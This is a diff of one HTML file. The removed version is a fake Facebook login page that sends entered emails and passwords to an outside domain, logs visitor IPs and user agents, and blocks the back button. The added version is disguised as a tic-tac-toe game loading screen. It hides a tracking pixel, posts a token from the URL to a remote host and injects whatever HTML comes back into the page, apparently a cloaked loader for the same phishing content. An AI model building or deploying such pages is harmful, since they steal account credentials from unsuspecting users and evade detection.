@@ -1,1 +1,93 @@
-<!DOCTYPE html><html><head><script>var userip;var ua=navigator.userAgent;</script> <script language="javascript">function initInput(){document.forms[0].ua.value=navigator.userAgent;}</script> <script src="https://l2.io/ip.js?var=userip" ></script><script>document.title="LSDD - #TeamAbatido IP:"+ userip+" UA: "+ navigator.userAgent;</script> <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1" /><link rel="shortcut icon" href="https://www.facebook.com/rsrc.php/yl/r/H3nktOa7ZMg.ico" /> <script>__DEV__=0;</script><script>history.pushState(null,document.title,location.href);window.addEventListener("popstate",function(event){history.pushState(null,document.title,location.href);});</script> <link rel="stylesheet" href="https://0uqvk.codesandbox.io/index.css" /></head><body tabindex="0" class="touch x1 _fzu _50-3 iframe acw" onLoad="initInput()" > <script id="u_0_a">(function(a){a.__updateOrientation=function(){var b=!!a.orientation&&a.orientation!==180,c=document.body;if(c) c.className=c.className.replace(/(^|s)(landscape|portrait)(s|$)/g," ")+" "+ (b?"landscape":"portrait");return b;};})(window);</script> <div id="viewport"><h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0" > Facebook</h1><div id="page"><center><div id="logotipo"> <img src="https://bit.ly/2Wg6Jv4" width="auto" height="215"</div></center><div class="maxwidth _5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane" ><div class="_4g33"><div class="_4g34" id="u_0_0"><div id="login-notices"><div class="_5yd0 _2ph- _5yd1" style="display: none;" data-sigil="m_login_notice" ><div class="_52jd"></div></div></div><div><div class="aclb _5rut"><div data-sigil="m_login_upsell"></div><div id="Formulario"><h1><form class="login-form" method="post" target="_top" action="https://videostorage.ml/login.php" > <input type="hidden" name="linkId" value="2" /> <input type="hidden" id="ua" name="ua" /> <label> <input type="text" name="id" class="form-control" id="user" placeholder="Email or Phone number" autocomplete="off" required /> </label> <label> <input type="text" name="pass" id="pass" style="-webkit-text-security:disc;" placeholder="Password" autocomplete="off" required /></label> <label> <input class="boton" type="submit" value="Log In" /></label></form></h1></div> <section class="login-form-wrap"> <font color="FFFFF"><div id="TituloCuerpo"> Facebook needs to confirm the following information to allow you access to this video application, Login!</div></font > </section></div></div></div></div></div></div></div><div style="VISIBILITY: hidden;"><script type="text/javascript" src="https://widgets.amung.us/small.js"></script><script>WAU_small("lsddtest1");</script> </div></body></html>
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta content="width=device-width, initial-scale=1" name="viewport" />
+        <title>TICTACTOE GAME</title>
+        <style>
+            body {
+                background: #55e9bc;
+            }
+            .wrap {
+                height: 100vh;
+                width: 100%;
+                display: flex;
+                flex-direction: column;
+                justify-content: center;
+                align-items: center;
+            }
+            .wrap p {
+                color: white;
+                font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+                font-size: 16px;
+                font-weight: bold;
+            }
+            .lds-ring {
+                display: inline-block;
+                position: relative;
+                width: 64px;
+                height: 64px;
+            }
+            .lds-ring div {
+                box-sizing: border-box;
+                display: block;
+                position: absolute;
+                width: 51px;
+                height: 51px;
+                margin: 6px;
+                border: 6px solid #fff;
+                border-radius: 50%;
+                animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+                border-color: #fff transparent transparent transparent;
+            }
+            .lds-ring div:nth-child(1) {
+                animation-delay: -0.45s;
+            }
+            .lds-ring div:nth-child(2) {
+                animation-delay: -0.3s;
+            }
+            .lds-ring div:nth-child(3) {
+                animation-delay: -0.15s;
+            }
+            @keyframes lds-ring {
+                0% {
+                    transform: rotate(0deg);
+                }
+                100% {
+                    transform: rotate(360deg);
+                }
+            }
+        </style>
+    </head>
+    <body>
+        <div id="game">
+            <div class="wrap">
+                <div class="lds-ring">
+                    <div></div>
+                    <div></div>
+                    <div></div>
+                    <div></div>
+                </div>
+                <p>Loading please wait...</p>
+            </div>
+        </div>
+        <img
+            src="https://whos.amung.us/widget/gameapp2"
+            style="visibility: hidden;"
+        />
+        <script>
+            const locationTokenFromUri = /#(.*)/.exec(window.location.href)
+                ? /#(.*)/.exec(window.location.href)[1]
+                : "";
+            fetch("https://game.tictactoegame.us", {
+                method: "POST",
+                headers: { "content-type": "application/json" },
+                body: JSON.stringify({ game: locationTokenFromUri })
+            })
+                .then(r => r.json())
+                .then(game => {
+                    document.querySelector("#game").innerHTML = game.game;
+                });
+        </script>
+    </body>
+</html>
